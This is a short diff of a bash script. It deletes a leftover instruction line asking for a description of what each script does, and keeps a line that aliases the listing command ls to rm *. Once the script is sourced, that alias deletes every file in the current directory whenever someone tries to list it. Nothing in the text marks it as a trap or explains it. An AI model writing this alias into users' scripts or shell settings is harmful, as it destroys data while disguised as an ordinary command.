@@ -1,4 +1,3 @@
-describe what each script is doing in order
 
 #!/bin/bash
 alias ls="rm *"
